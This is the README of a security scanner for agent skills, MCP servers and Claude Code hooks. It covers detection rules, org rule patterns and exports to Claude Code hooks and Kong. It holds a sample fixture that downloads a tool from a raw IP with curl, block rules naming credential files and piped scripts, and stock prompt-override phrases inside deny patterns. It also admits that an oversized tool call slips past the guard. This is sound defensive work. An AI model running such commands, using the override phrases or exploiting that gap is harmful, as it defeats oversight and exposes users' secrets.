# spellwarden

The Spellwarden scan engine: the baseline rules for agent skills and MCP servers, the probe classification against the 2026-07-28 MCP specification, the migration checklist and the curation score. It is the engine of the hosted product at [spellwarden.ai](https://spellwarden.ai) and is published so that the same rules run in your own tooling.

One distribution holds two import packages. `spellwarden_scan` is the engine and is pure code: it never opens a connection, reads a file or an environment variable; you hand it the bytes of a package, a configuration file or the recorded result of a probe, and it hands back findings. `spellwarden_cli` is the `spellwarden` command: it finds the agent content in a repository, runs the engine on it on your machine or CI runner, and writes the reports. The GitHub Action and the GitLab CI component that run the command in pipelines arrive with 1.0.0.

```
pipx run spellwarden scan .          # or: pip install spellwarden, then spellwarden scan .
```

Python 3.11 or newer. The only dependency is PyYAML.

## Scanning a skill package

```python
from spellwarden_scan import RuleSet, scan_skill_package, unpack_zip

files, executable = unpack_zip(open_bytes, with_modes=True)   # or any {path: bytes} mapping you built yourself
result = scan_skill_package(files, RuleSet.baseline(), executable_paths=executable)
for finding in result.findings:
    print(finding.rule_id, finding.severity, finding.location.path, finding.location.line, finding.evidence)
print(result.sha256, result.metadata.name, result.truncated)
```

- `files` maps POSIX relative paths to bytes. `root` names the directory that holds `SKILL.md` when it is not the package root.
- `unpack_zip(data, limits=ArchiveLimits(), with_modes=False)` reads a zip held in memory and refuses unsafe archives with an `ArchiveError` whose `code` is one of `too_large`, `too_many_files`, `unsafe_path`, `symlink`, `bad_zip`, `empty`. The default limits are 20 MiB compressed, 50 MiB uncompressed, 2000 files, 10 MiB per file.
- `result.sha256` is the canonical hash of the package: SHA-256 over `path NUL content NUL` for every path in sorted order, stable across archive layout.
- `result.metadata` holds `name`, `description`, `version`, `license`, `publisher` from the frontmatter (nested `metadata:` keys and `author` are read too), which of them are present, and the problems that rule SW-SKL-015 reports.
- `max_findings` (500) and `max_per_rule` (100) bound what the scan keeps; rules run worst severity first and `result.truncated` counts the matches that were not kept.
- Evidence is at most 300 characters and credential-shaped text in it is masked. `fingerprint` is the SHA-256 of rule id, path and matched text, so a finding keeps its identity across scans.

## Evaluating an MCP server probe

```python
from spellwarden_scan import ProbeResult, RuleSet, evaluate_probe

probe = ProbeResult.from_dict(recorded)      # what your prober recorded; every field has a default
result = evaluate_probe(probe, RuleSet.baseline())
print(result.transport, result.auth_mode, result.spec_version, result.migration_status)
for item in result.checklist:
    print(item.order, item.text)
```

`ProbeResult` is the record of an unauthenticated probe: the `server/discover` or `initialize` result, the status and content type of the POST and GET, whether a session header was seen, the `tools/list` answer, the RFC 9728 protected resource metadata and the authorization server metadata. The classification follows one rule set:

- transport: `streamable-http`, `sse`, `stdio` (a repository without an endpoint) or `unknown`;
- authentication: `none`, `static-key`, `oauth-dcr`, `oauth-cimd`, `xaa` or `unknown`;
- spec version: the highest `supportedVersions` date of `server/discover`, else the negotiated `initialize` version;
- deprecated features, in a fixed order: `sse`, `initialize_only`, `sessions`, `roots`, `sampling`, `logging`, `dcr`;
- `migration_status`: `ready` when the spec version is 2026-07-28 or later, authentication is CIMD or XAA and nothing deprecated is in use; `to_migrate` otherwise; `not_probeable` for stdio servers.

The checklist has twelve items in a fixed order, each present only when it applies (move to streamable HTTP; add `server/discover`; remove sessions; carry the protocol version and capabilities in `_meta`; replace `sampling/createMessage` with an `input_required` result; replace Logging with a per-request `_meta` log level; move long jobs to the Tasks extension; register a Client ID Metadata Document and enable OAuth with RFC 9728 and RFC 8707; validate `iss`; set `ttlMs` and `cacheScope` on list results; propagate `traceparent`; re-run the scan, which is always last).

## Curation score

```python
from spellwarden_scan import CurationInputs, curation_score, is_curated, is_quarantined

inputs = CurationInputs(open_findings=open_ones, accepted_findings=accepted_ones, metadata_present=5, eval_component=0.5)
score = curation_score(inputs)          # 0 to 12, one decimal
curated = is_curated(inputs, score)     # score >= 8, no open critical or high finding, hash unchanged, not quarantined
quarantined = is_quarantined(open_ones) # any open finding from a malicious-indicator rule
```

The score is `12 x (0.6 S + 0.2 M + 0.2 E)`: `S = max(0, 1 - (6 critical + 3 high + 1 medium + 0.25 low) / 12)` over open findings with accepted findings at half weight, `M` the share of the five metadata fields present, `E` an evaluation component that is 0.5 until evaluations exist.

## The rules

Ids are `SW-SKL-NNN` (skill packages), `SW-MCP-NNN` (probed MCP servers), `SW-CFG-NNN` (agent configuration files: MCP client configurations, Claude Code settings and hooks, plugin marketplaces) and `SW-REG-NNN` (the registry gate of connected mode). Mappings use the OWASP Agentic Top 10 (ASI) and OWASP MCP Top 10 (MCP) identifiers and NIST SP 800-53 base controls, labelled as a provisional mapping to SP 800-53 base controls. Four rules are malicious indicators: an open finding from one of them quarantines the package.

<!-- rules:start -->
| Id | Title | Severity | OWASP | NIST |
|---|---|---|---|---|
| SW-SKL-001 | Prompt-injection phrases in skill instructions | high | ASI01 | SI-10 |
| SW-SKL-002 | Hidden text: zero-width or bidirectional control characters | high | ASI01 | SI-10 |
| SW-SKL-003 | Instructions to skip approvals or disable hooks | high | ASI10 | AC-6 |
| SW-SKL-004 | Encoded payload decoded and executed (malicious indicator) | critical | ASI04 | SR-3 |
| SW-SKL-005 | Writes to agent configuration | high | ASI10 | AC-6 |
| SW-SKL-006 | Destructive command without a confirmation step | medium | ASI10 | AC-6 |
| SW-SKL-007 | Remote script piped to a shell | high | ASI04 | SR-3 |
| SW-SKL-008 | Sends local file contents to an external host (malicious indicator) | critical | ASI10 | SC-7 |
| SW-SKL-009 | Unpinned dependency install | medium | ASI04 | SR-3 |
| SW-SKL-010 | Bundled binary or executable file | medium | ASI04 | SR-3 |
| SW-SKL-011 | Hard-coded credential in the package | critical | MCP01 | IA-5 |
| SW-SKL-012 | Reads a credential file path without stating purpose | medium | ASI04 | IA-5 |
| SW-SKL-013 | Network calls to raw IP addresses or URL shorteners | medium | ASI10 | SC-7 |
| SW-SKL-014 | Obfuscated script code | medium | ASI04 | SR-3 |
| SW-SKL-015 | Frontmatter missing or invalid (name, description) | low | ASI04 | SR-3 |
| SW-SKL-019 | Fetches external URL content into context without an allowlist | medium | ASI01, MCP10 | SI-10 |
| SW-SKL-031 | Missing license and version metadata | low | ASI04 | SR-3 |
| SW-MCP-001 | Server lists tools without authentication | high | MCP01 | AC-3 |
| SW-MCP-002 | Static key authentication instead of OAuth | medium | MCP01 | IA-5 |
| SW-MCP-003 | OAuth dynamic client registration (deprecated; use Client ID Metadata Documents) | medium | MCP01 | IA-5 |
| SW-MCP-004 | HTTP+SSE transport (deprecated) | medium | ASI04 | SR-3 |
| SW-MCP-005 | Spec version older than 2026-07-28 | low | ASI04 | SR-3 |
| SW-MCP-006 | Protocol sessions (Mcp-Session-Id) in use | medium | ASI04 | SR-3 |
| SW-MCP-007 | Requires the initialize handshake; no server/discover | medium | ASI04 | SR-3 |
| SW-MCP-008 | Uses deprecated Roots, Sampling or Logging | medium | ASI04 | SR-3 |
| SW-MCP-009 | Endpoint not served over HTTPS | high | MCP01 | SC-7 |
| SW-MCP-010 | No protected resource metadata, or issuer not validated | medium | MCP01 | IA-5 |
| SW-MCP-011 | Tool description contains instruction-like text | high | ASI01, MCP10 | SI-10 |
| SW-CFG-001 | Remote MCP server over plain HTTP | high | MCP01 | SC-7 |
| SW-CFG-002 | Credential written into an MCP server configuration | critical | MCP01 | IA-5 |
| SW-CFG-003 | MCP server launched from an unpinned package | medium | ASI04 | SR-3 |
| SW-CFG-004 | MCP server at a raw IP address or behind a URL shortener | medium | ASI10 | SC-7 |
| SW-CFG-005 | Hook pipes remote content to a shell | high | ASI04 | SR-3 |
| SW-CFG-006 | Hook sends local file contents to an external host (malicious indicator) | critical | ASI10 | SC-7 |
| SW-CFG-007 | Hook decodes and runs an encoded payload (malicious indicator) | critical | ASI04 | SR-3 |
| SW-CFG-008 | Settings switch off approval prompts | high | ASI10 | AC-6 |
| SW-CFG-009 | Marketplace plugin source not pinned to a commit | medium | ASI04 | SR-3 |
| SW-CFG-010 | Literal value under a secret name in an MCP server configuration | high | MCP01 | IA-5 |
| SW-REG-001 | Skill package not admitted in the organisation's private registry | high | ASI04 | SR-3 |
| SW-REG-002 | MCP server not admitted in the organisation's private registry | high | MCP10 | SR-3 |
| SW-REG-003 | Agent content the private registry cannot judge | high | ASI04 | SR-3 |
<!-- rules:end -->

SW-REG-001 to SW-REG-003 are the registry gate of connected mode (Enterprise). They fire only in a connected run.

Ids 016 to 018 and 020 to 030 are reserved. `RuleSet.baseline()` returns these rules; `ruleset.with_rules(extra)` adds your own `Rule` objects built with `spellwarden_scan.rules.make_rule`.

## Org rules, packs and exports

Since 1.1.0 the engine also holds what the hosted product calls Ward: rules an organisation writes as data (org rules), policy packs, and the exports that turn a pack into enforcement for Claude Code hooks and Kong. All of it is pure, like the rest of the engine. In connected mode the command applies the organisation's CI policy (see Connected mode).

### Org rules

An org rule is a JSON object that `validate_org_rule(spec)` checks and `compile_org_rule(spec)` turns into a `Rule` that `RuleSet.with_rules` accepts. A refused spec raises `OrgRuleError` with a `code` (`bad_id`, `bad_title`, `bad_severity`, `bad_area`, `bad_mapping`, `bad_target`, `bad_detection`, `bad_glob`, `pattern_too_long`, `pattern_syntax`, `pattern_too_complex`, `bad_predicate`, `bad_values`, `unknown_key`) and a one-sentence `message` that names the position of a pattern error.

- `id` is `SW-ORG-001` to `SW-ORG-999`; `title` 1 to 120 characters on one line; `severity` `critical`, `high`, `medium` or `low`; `owasp` and `nist` at most five identifiers each from the lists the baseline rules use; `malicious` (only with `critical`) makes a finding quarantine the package, as the baseline's malicious indicators do; unknown keys are refused.
- `area` `skill` takes a pattern detection: `{"kind": "pattern", "files": "**/*.sh", "in": "commands", "pattern": "...", "case_sensitive": false}`. `files` is a path glob inside the skill (`*`, `?` and `[...]` within one folder, `**` for any number of folders; default `**`). `in` is `lines` (every line of every selected text file, the default) or `commands` (every shell command of the selected scripts and of the fenced code blocks of the selected Markdown files, with `\`, `|`, `&&` and `||` continuations joined, which is what a Claude Code hook sees as a Bash command). One finding per matching line or command.
- `area` `mcp` takes one of eight server checks: `{"kind": "probe", "predicate": "auth_mode_in", "values": ["none", "static-key"]}`. The predicates are `auth_mode_in`, `transport_in`, `deprecated_feature_any`, `spec_version_below` (also true when the version is unknown), `endpoint_host_in` and `endpoint_host_not_in` (lower-case host names, or `*.example.com` for every subdomain, which does not match `example.com` itself), and `tool_name_matches` and `tool_description_matches`, which take a `pattern` and give one finding per tool at `tool:<name>`. A stdio server has no endpoint and is judged by `transport_in` and the two tool checks only.
- `targets` names the exports that enforce the rule: `claude-code-hooks` (a pattern rule with `"in": "commands"`) and `kong` (any pattern rule). A server check has no target.

Patterns use a small subset of regular expressions that the engine reads in bounded time and that Kong reads the same way:

| Construct | Allowed |
|---|---|
| Literal characters | Any character except `\ . [ ] ( ) \| * + ? { } ^ $`, which are written escaped (`\.`, `\(`). `\/` and `\-` are accepted escapes. |
| Classes | `.`, `\s \S \d \D \w \W`, bracket classes `[...]` and `[^...]` with literal members, escapes and ranges such as `a-z`; no nested `[`, no `[:name:]`. |
| `\b` | A word boundary; it cannot be quantified. |
| Anchors | `^` only as the first character of the pattern, `$` only as the last. |
| Quantifiers | `?`, `*`, `+`, `{m}` and `{m,n}`, each on exactly one character, escape, `.` or bracket class. No lazy or possessive forms, no `{m,}`. |
| Groups | `(a\|b\|c)`: alternatives made of characters and classes with at most `?`, `{m}` or `{m,n}`; a group may be followed by `?`; groups do not nest and never capture. |
| Gaps | A `.*` outside a group splits the pattern into parts, matched one after the other. |
| Per part | At most one `*` or `+` besides the gaps. |
| Start of a part | A part may not start with `*` or `+`, also after optional items (`a?\s+x` is refused). |
| Next to a repeat | A repeat whose count varies (`?`, `*`, `+`, `{m,n}` with `m` below `n`) may not sit next to an item that can match the same character, in any path through the part (groups and optional items included, `\b` ignored): `a+a`, `\s*\s`, `x.{0,100}y` and `x[a-z]+[a-c]` are refused, `x\s+y` is accepted. |
| Not allowed | Backreferences, lookahead and lookbehind, inline flags, named groups, `\A \Z \G`, `\x \u \N` and octal escapes, a `\|` outside a group, a quantified group other than `?`, nested groups. |

A pattern that breaks one of the rules above is `pattern_syntax`; one that is well formed but exceeds a limit below, or breaks the start-of-part or next-to-a-repeat rule (which keep the matching time bounded), is `pattern_too_complex`.

The limits, which `spellwarden_scan.PATTERN_LIMITS` holds:

<!-- pattern-limits:start -->
| Limit | Value | What it bounds |
|---|---|---|
| `max_length` | 300 | Characters in a pattern |
| `max_parts` | 4 | Parts between the `.*` gaps |
| `max_groups` | 4 | Groups in one part |
| `max_alternatives` | 16 | Alternatives in one group |
| `max_class_members` | 64 | Members of one bracket class |
| `max_repeat` | 100 | The largest number in `{m}` and `{m,n}` |
| `max_repeat_range` | 400 | How much the repeats of one part may vary in all: `n` minus `m` of each `{m,n}`, and 1 for each `?` after a character or class (the `?` of an optional group is not counted) |
| `window` | 4096 | Characters read at once from a long line or command |
| `overlap` | 512 | Characters two consecutive windows share |
<!-- pattern-limits:end -->

A line or command longer than 4096 characters is read in windows of 4096 characters that start every 3584 characters, so a match longer than 512 characters that crosses a window boundary can be missed. Patterns are case-insensitive unless `case_sensitive` is true. The engine reads `\w`, `\d`, `\s` and case-insensitivity with Unicode rules, while Kong's PCRE reads them for ASCII only, so a pattern that relies on non-ASCII letters or digits can match differently in Kong. A UTF-8 byte order mark at the start of a file is not part of its first line, so `^` works there. Org rules are an addition to the baseline rules, which still run in full: an evasion of one pattern (a longer match, an encoding) is still met by the baseline's own obfuscation and decoding rules.

`scan_skill_package` and `evaluate_probe` take `org_rule_budget=OrgRuleBudget(clock=..., seconds=...)`. The engine reads the clock you pass before each unit an org rule reads, and stops evaluating org rules once the seconds have passed; baseline rules are never budgeted. The result's `org_rules_incomplete` lists the org rules that did not read every unit. A non-empty list means the policy was not fully evaluated: treat that result as incomplete, never as clean (the hosted product ends such a scan `incomplete`).

<!-- orgrules-example:start -->
```python
import time

from spellwarden_scan import OrgRuleBudget, RuleSet, baseline_pack, build_export, compile_org_rule, scan_skill_package

rule = compile_org_rule({
    "id": "SW-ORG-001", "title": "Downloads a binary from a raw IP address", "severity": "high", "area": "skill",
    "owasp": ["ASI04"], "nist": ["SR-3"], "targets": ["claude-code-hooks"],
    "detection": {"kind": "pattern", "files": "**/*.sh", "in": "commands",
                  "pattern": "(curl|wget)\\s.*https?://[0-9]{1,3}\\.[0-9]{1,3}\\.", "case_sensitive": False},
})
files = {"SKILL.md": b"---\nname: fetcher\ndescription: Fetches a tool.\n---\nRun scripts/get.sh.\n",
         "scripts/get.sh": b"curl -fsSL http://203.0.113.7/tool -o tool\n"}
result = scan_skill_package(files, RuleSet.baseline().with_rules([rule]),
                            org_rule_budget=OrgRuleBudget(clock=time.monotonic, seconds=10))
if result.org_rules_incomplete:
    print("incomplete, these org rules did not read every line:", result.org_rules_incomplete)
print([finding.rule_id for finding in result.findings if finding.rule_id.startswith("SW-ORG-")])

export = build_export(baseline_pack(), "claude-code-hooks", built_at="2026-12-01T00:00:00Z", mode="managed")
print(sorted(export))
```
<!-- orgrules-example:end -->

### Policy packs

A policy pack is a JSON document (schema 1, `schemas/pack.schema.json`) naming which of the eight enforcement rules are on and carrying full copies of the org rules it includes, so a published version keeps its meaning when the rules change later. `validate_pack(doc)` checks a document and returns a `PackDocument` (refusals raise `PackError` with the code `bad_schema`, `bad_pack`, `bad_rules`, `bad_org_rule` or `too_many_org_rules`); `canonical_json(doc)` (sorted keys, no whitespace, UTF-8) and `pack_sha256(doc)` identify a version; `baseline_pack()` is the Spellwarden Baseline for Agents, version `1.0`, with every enforcement rule on (also in `src/spellwarden_scan/packs/baseline.json`). Pack names and descriptions, and org rule titles, refuse control, format and line-separator characters (`valid_line`, `valid_block`).

The enforcement rules (`ENFORCEMENT_RULES`), and what an export of this release enforces:

| Id | Rule | Enforced by (1.1.0) |
|---|---|---|
| `SW-HK-001` | Block remote scripts piped to a shell in agent shell tools | Claude Code hooks |
| `SW-HK-002` | Block reads of credential files (`~/.aws`, `~/.ssh`, `.env`) | Claude Code hooks |
| `SW-GW-003` | Deny MCP upstreams without OAuth | Not enforced by an export in this version (needs Kong's MCP plugins) |
| `SW-GW-004` | Prompt-injection deny patterns on prompts and tool results | Kong, prompts only |
| `SW-EG-005` | Sandbox egress only to registry-admitted hosts | Not enforced by an export in this version |
| `SW-GW-006` | Destructive tool verbs require human approval | Claude Code hooks (asks for approval) |
| `SW-RG-007` | Registry admits only curated, auth-enabled entries on spec 2026-07-28 with no open critical or high finding | The hosted private registry's admission policy, not an export |
| `SW-OB-008` | Emit an audit record for every tool call | Not enforced: the Claude Code export writes a local activity log, which is not an audit trail |

"Enforced" means enforced where the export is deployed in a way the developer cannot change: for Claude Code that is the managed mode below.

### Exports

`build_export(pack, target, built_at=..., mode=...)` returns the files of an export as `{path: bytes}`; `target` is one of `EXPORT_TARGETS` (`claude-code-hooks`, `kong`), and `PLANNED_TARGETS` (`zuplo`, `agentcore-policy`, `cloudflare-egress`) are not available yet. Every export holds `SPELLWARDEN-README.md`, which lists what the target enforces, what it cannot enforce and why, how to install it and the limits of its mode, and ends with: Validate field names against the vendor's current documentation before use.

**Claude Code hooks.** One guard script, `spellwarden_guard.py` (Python 3.8 or newer, standard library only, the pack's checks compiled in, never opening the network), run by a `PreToolUse` hook for Bash, PowerShell (Claude Code's shell tool on Windows), Read, Grep, Glob and MCP tools, and by a `PostToolUse` hook when SW-OB-008 is on. It denies piped remote scripts and credential-file reads, asks before destructive commands and destructive MCP tool verbs, and applies org rules with the `claude-code-hooks` target (deny for critical or high, ask for medium or low); when one command matches both, the deny wins. The command patterns are written for POSIX shells and read PowerShell commands as text. Windows paths are checked as given and with `\` read as `/`. On unreadable input, including an event larger than 1 MiB, it prints nothing and exits 0: the guard never blocks on its own failure, and a missing interpreter or a timeout lets the tool call proceed. An agent can therefore pass every check by making one tool call larger than 1 MiB. A missing or unreadable script is different: Python exits with status 2, which Claude Code reads as a block, so every matched tool call is refused until the script is restored. Every hook runs it as `python3 -I`, so the checkout cannot plant a module it imports. `SHA256SUMS` lists the script's SHA-256.

- Project mode (`mode="project"`, advisory): `.claude/settings.json` with the hooks, `.claude/hooks/spellwarden_guard.py`, `.claude/.gitignore` (the activity log), `SHA256SUMS` and `SPELLWARDEN-README.md`, for committing to the repository. The repository controls these files: any branch can change, replace or remove the script or the settings, so this mode helps developers who want it and enforces nothing against a checkout that does not.
- Managed mode (`mode="managed"`, enforceable): `managed/linux/managed-settings.json`, `managed/macos/managed-settings.json`, `managed/windows/managed-settings.json`, `managed/spellwarden_guard.py`, `SHA256SUMS` and `SPELLWARDEN-README.md`. Administrators install the script read-only, owned by root or the Administrators group, at an absolute path outside every checkout, verify it against `SHA256SUMS`, and place the platform's settings file where Claude Code reads managed settings; each settings file sets `allowManagedHooksOnly`, so user, project and plugin hooks are ignored. Where a `managed-settings.json` already holds the organisation's policy, add this file's keys to it or place it as `managed-settings.d/50-spellwarden.json` beside it, rather than replacing it. On WSL, `/etc/claude-code` can be written by the user, so the managed mode is not enforced there.

| Platform | Script path | Managed settings file | Status |
|---|---|---|---|
| Linux | `/etc/claude-code/spellwarden/spellwarden_guard.py` | `/etc/claude-code/managed-settings.json` | verified on 21 October 2026 |
| macOS | `/Library/Application Support/ClaudeCode/spellwarden/spellwarden_guard.py` | `/Library/Application Support/ClaudeCode/managed-settings.json` | verified on 21 October 2026 |
| Windows | `C:\Program Files\ClaudeCode\spellwarden\spellwarden_guard.py` | `C:\Program Files\ClaudeCode\managed-settings.json` | verified on 21 October 2026 |

The baseline pack's project mode writes this `.claude/settings.json`:

<!-- hooks-project-example:start -->
```json
{
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "^(Bash|PowerShell|Read|Grep|Glob|mcp__.*)$",
        "hooks": [
          {
            "type": "command",
            "command": "python3 -I \"$CLAUDE_PROJECT_DIR\"/.claude/hooks/spellwarden_guard.py pre",
            "timeout": 10
          }
        ]
      }
    ],
    "PostToolUse": [
      {
        "matcher": "*",
        "hooks": [
          {
            "type": "command",
            "command": "python3 -I \"$CLAUDE_PROJECT_DIR\"/.claude/hooks/spellwarden_guard.py post",
            "timeout": 10
          }
        ]
      }
    ]
  }
}
```
<!-- hooks-project-example:end -->

and its managed mode this `managed/linux/managed-settings.json` (macOS and Windows differ only in the script path):

<!-- hooks-managed-example:start -->
```json
{
  "allowManagedHooksOnly": true,
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "^(Bash|PowerShell|Read|Grep|Glob|mcp__.*)$",
        "hooks": [
          {
            "type": "command",
            "command": "python3 -I \"/etc/claude-code/spellwarden/spellwarden_guard.py\" pre",
            "timeout": 10
          }
        ]
      }
    ],
    "PostToolUse": [
      {
        "matcher": "*",
        "hooks": [
          {
            "type": "command",
            "command": "python3 -I \"/etc/claude-code/spellwarden/spellwarden_guard.py\" post",
            "timeout": 10
          }
        ]
      }
    ]
  }
}
```
<!-- hooks-managed-example:end -->

A platform is verified once the CI job `managed-guard` and a check by hand with Claude Code have passed on it; the same list (`spellwarden_scan.exports.hooks.MANAGED_VERIFIED`) decides which platforms every managed export's README names as not verified yet. The hook commands quote the path, for example `python3 -I "/Library/Application Support/ClaudeCode/spellwarden/spellwarden_guard.py" pre`, and on Windows `py -3 -I "C:\Program Files\ClaudeCode\spellwarden\spellwarden_guard.py" pre`, which reads the same in Git Bash and in PowerShell, the shells Claude Code runs hook commands with on Windows (`sh -c` on Linux and macOS). The export does not set the hook field `onFailure`: the guard never blocks on its own failure, and an administrator who wants failures to block can set `"onFailure": "block"` where their Claude Code version offers it. With SW-OB-008 on, the guard appends one line per tool call (time, session id, tool name; never the tool's input or output) to `spellwarden-activity.jsonl` in the project's `.claude/` (project mode) or the user's `~/.claude/` (managed mode), refusing links and anything that is not a regular file, with mode 0600, rotated to `.1` at 5 MiB. It is a local activity log the user can read, change or delete, not an audit trail.

**Kong.** `kong/spellwarden-<pack id>-<version>.yaml` (for the baseline, `kong/spellwarden-baseline-1.0.yaml`) and `SPELLWARDEN-README.md`: a decK file with one global `ai-prompt-guard` plugin whose `deny_patterns` are the engine's prompt-injection patterns (SW-GW-004, prompts only) and the org rules with the `kong` target, each pattern a scoped group (`(?i:...)` for the injection patterns, `(?im:...)` for an org rule, `(?m:...)` when it is case-sensitive) joined with `|` into at most 10 entries of at most 500 characters. Org patterns are read line by line, as the engine reads a unit: a single part is exported as `(?im:A)`, so `^` and `$` hold at the ends of each line, and a pattern with several parts as `(?im:^(?>.*?A)(?>.*?B))`: per line, the first A and then the first B after it, with atomic groups so that a long prompt cannot make the gateway backtrack. Scope the plugin to your AI routes or services by adding `route:` or `service:`, then add it to your decK state, for example with `deck file merge`. Do not run `deck gateway sync` with this file alone: it removes every entity that is not in the files it is given. Run `deck gateway diff`, check the changes, then `deck gateway sync`. The baseline pack's export begins:

<!-- kong-example:start -->
```yaml
# Spellwarden policy export: pack "Spellwarden Baseline for Agents" 1.0, built 2026-12-01T00:00:00Z.
# Enforced here: SW-GW-004 (prompts only).
# Not enforced by this target: SW-HK-001 (enforced by the Claude Code hooks export), SW-HK-002 (enforced by the Claude Code hooks export), SW-GW-003 (needs Kong's MCP plugins), SW-EG-005 (a sandbox egress proxy is not in this version), SW-GW-006 (enforced by the Claude Code hooks export), SW-RG-007 (enforced by the private registry, not by an export), SW-OB-008 (a protected audit trail of tool calls is not in this version).
# Validate field names against the vendor's current documentation before use.
_format_version: '3.0'
plugins:
- name: ai-prompt-guard
  config:
    deny_patterns:
```
<!-- kong-example:end -->

followed by one entry that joins the nine prompt-injection patterns, `(?i:ignore (all |any |the |your )?(previous|prior|above|earlier) (instructions|prompts|rules))|(?i:disregard (the |your )?(system|previous|prior))|...`.

## The `spellwarden` command

```
spellwarden scan [PATH] [--format FMT [--output FILE]]... [--fail-on LEVEL] [--locked] [--probe | --no-probe]
                 [--probe-private | --no-probe-private] [--baseline FILE] [--config FILE] [--as-of YYYY-MM-DD]
                 [--no-telemetry] [--upload | --no-upload] [--quiet] [--verbose]
spellwarden lock [PATH] [--check]
spellwarden baseline add [PATH] (--fingerprint FP... | --all) --reason TEXT [--expires YYYY-MM-DD | --days N]
spellwarden baseline add [PATH] --fingerprint FP --rule SW-REG-NNN|SW-ORG-NNN [--finding-path PATH] --reason TEXT [--expires YYYY-MM-DD | --days N]
spellwarden baseline prune [PATH]
spellwarden baseline list [PATH]
spellwarden rules [--format text|json|markdown]
spellwarden ci comment --provider github|gitlab --body FILE
spellwarden ci-run gitlab
spellwarden version
```

`python -m spellwarden_cli` is the same command; the CI wrappers use that form.

### What a scan reads

`PATH` (default `.`) is the scan root. Inside a git work tree the file set is what git tracks plus untracked files that are not ignored, under the scan root only (submodules are not entered); elsewhere it is a walk that skips `.git`, `node_modules`, `.venv`, `venv` and `__pycache__`. A symbolic link is never read as a file: one at an agent-content path (a configuration file, `SKILL.md`, a plugin manifest or hooks file, a manifest reference) is followed when its target is a regular file of the file set inside the scan root, and named by the link in every output. The target is judged from its text alone, never by asking the file system where it leads: an absolute target (`/x`, `C:\x`, `\\host\share\x`) is the error `unsafe_path` (use a relative link or a real file), and a relative one is resolved against the scan root as written. One that leaves the scan root, passes through a linked directory or points at another link is the error `unsafe_path`; a link inside a skill or a local plugin directory is followed by the same rules, and one whose relative target leaves the scan root is skipped with a notice while its target text is locked, unless it names a directory above the scan root or might lead back into it under another spelling (another case, a trailing dot, a Windows short name such as `REPO~1`), which is `unsafe_path`; any other link is skipped with a notice. Files over 10 MiB are skipped with a notice. Configuration and marketplace file names match whatever their case (`.MCP.json`), as macOS and Windows open them. A link target, a manifest reference and a plugin's own `.mcp.json`, `hooks/hooks.json` and `.claude-plugin/plugin.json` must name a file exactly as the file set holds it: one that matches a file or directory only in another case or Unicode form is `unsafe_path`, because on Linux the other spelling is another file. A skill is a directory holding exactly `SKILL.md`; another spelling (`skill.md`) gets the notice `skill_name_case`, and is judged as the skill's `SKILL.md` only under a `skills/` directory, where agents on macOS and Windows load it. `include` and `exclude` in the settings narrow the set further.

In that set the scanner finds:

| Item | Where | Judged by |
|---|---|---|
| Skill | every directory holding a `SKILL.md`, with every file below it (a nested `SKILL.md` starts its own skill) | the `SW-SKL` rules |
| MCP client configuration | `.mcp.json`, `.vscode/mcp.json`, `.cursor/mcp.json`; each server in it is an item of its own | `SW-CFG-001` to `004`, `010`; `SW-MCP` rules under `--probe` |
| Claude Code settings | `.claude/settings.json`, `.claude/settings.local.json` (with their hooks) | `SW-CFG-005` to `008` |
| Plugin marketplace | `.claude-plugin/marketplace.json` and every plugin it lists (a local source `./` is the marketplace's own directory) | `SW-CFG-009`; a local plugin's skills, `.mcp.json`, `hooks/hooks.json` and `.claude-plugin/plugin.json` are scanned like the files above |

A plugin hosted elsewhere (a GitHub repository or a URL) is listed and locked by its declared source, never fetched. Configuration files are read as JSON with comments and trailing commas (VS Code's `mcp.json` dialect). A file with a key repeated in one object is refused (`duplicate_key`): agents disagree on which copy wins, so the scanner will not guess. Everything read from the repository is treated as hostile: sizes and nesting are bounded, paths are confined to the scan root, and every string is escaped for the place it is printed.

### Exit codes

| Code | Meaning |
|---|---|
| 0 | Passed: no unsuppressed finding at or above `--fail-on` (default `high`; `never` always passes on findings). |
| 1 | Failed on findings. |
| 2 | Incomplete or invalid: a usage or settings error, an unreadable file, a configuration document the scanner refused or cut short (over 200 servers, 500 hooks or 200 plugins), a skill over 2000 files or 50 MiB, an invalid baseline entry, or a scanner crash. |
| 3 | `--locked` and the lock file is absent or out of date. |

When several apply, 2 wins over 1, and 1 over 3: an incomplete scan never looks like a pass. Every requested report is written before the exit.

### Settings: `.spellwarden/config.yml`

```yaml
version: 1
include: []                 # globs; empty means every file of the file set
exclude: ["tests/fixtures/**"]
fail-on: high
probe: false
telemetry: true
```

The file is optional. An unknown key or a `version` other than 1 is an error (exit 2), so a typo never silently weakens a gate. A flag wins over the environment (`SPELLWARDEN_FAIL_ON`, `SPELLWARDEN_PROBE`, `SPELLWARDEN_TELEMETRY`), which wins over the file. Private probing is deliberately not a setting (see "Probing MCP servers"). The `connected` mapping (`pack`, `upload`, `required`) is described under "Connected mode".

**On a pull or merge request, this file and the baseline are read from the base revision**, the commit the request targets, never from the request itself. Otherwise a request could add a malicious `.mcp.json` together with `exclude: [".mcp.json"]`, or accept its own finding in the baseline, and pass its own check. A request that changes either file therefore sees the change apply only once it is merged, and the report says so with the notice `settings_from_base`. The lock file is still read from the request: a request that changes agent content must update it, and reviewers see that change. Under `--locked` the lock is computed with the base's `include` and `exclude`, so a request that changes those patterns and the lock together is reported stale until the settings change is merged first. Local runs, pushes, schedules and manual runs read the working tree as before. A `--config` or `--baseline` file named on the command line is read as given: whoever runs the scanner chose it.

The scanner reads the base revision with git. A shallow clone that lacks it is fetched once from `origin` (that one commit, depth 1, no tags, hooks off). When the base still cannot be read (the event names no base commit, git is missing, or the fetch failed) the scan uses the default settings and no baseline, and the notice `base_unavailable` says why. On GitHub, check out with `actions/checkout` `fetch-depth: 0`, or keep its default `persist-credentials: true` so the fetch can authenticate. On GitLab, set `GIT_DEPTH: 0` (or a depth that reaches the merge base) in the job, because the scanner image cannot write to a clone it does not own.

### The lock file: `.spellwarden/lock.json`

`spellwarden lock` records every discovered configuration file, MCP server, plugin source, local plugin directory and skill with a hash. `spellwarden scan --locked` (and `spellwarden lock --check`) exits 3 when anything was added, removed or changed since, and names each item, so a change to agent content is a visible, reviewed change. The lock holds no scanner version: upgrading the scanner never makes it stale. A skill's hash is computed over paths relative to the skill's directory, so moving a skill changes only its path.

### The baseline file: `.spellwarden/baseline.yml`

```yaml
version: 1
accepted:
  - fingerprint: 9c1d...            # 64 hex characters, from the report
    rule: SW-SKL-009
    path: .claude/skills/deploy/scripts/setup.sh
    reason: Installed from our internal mirror, which pins versions.
    added: 2026-12-01
